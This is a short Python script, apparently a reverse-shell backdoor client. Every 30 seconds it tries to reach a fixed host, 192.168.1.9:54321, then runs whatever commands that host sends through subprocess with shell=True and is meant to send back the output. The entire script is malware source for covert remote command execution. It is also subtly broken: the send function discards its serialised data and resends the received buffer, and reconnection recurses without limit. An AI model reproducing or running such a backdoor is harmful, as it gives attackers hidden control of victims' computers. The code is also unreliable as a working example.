#!/usr/bin/python
import socket
import json
import subprocess
import time

def relaible_recv():
	global json_data 
	json_data=""
	while True:
		try:
			json_data=json_data + str(sock.recv(1024))
			return json.loads(json_data)
		except ValueError:
			continue

def relaible_send(data):
	json.dumps(data)
	sock.send(json_data)

def shell():
	while True:
		command=relaible_recv()
		if command=='q':
			break
		else:
			try:
				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result=proc.stdout.read()+proc.stderr.read()
				relaible_send(result)

			except:
				print("[!!]Can't execute the command "+command)


def connection():
	global sock
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	while True:
		time.sleep(30)
		try:
			sock.connect(("192.168.1.9",54321))
			shell()
		except:
			connection()
		
connection()
sock.close()
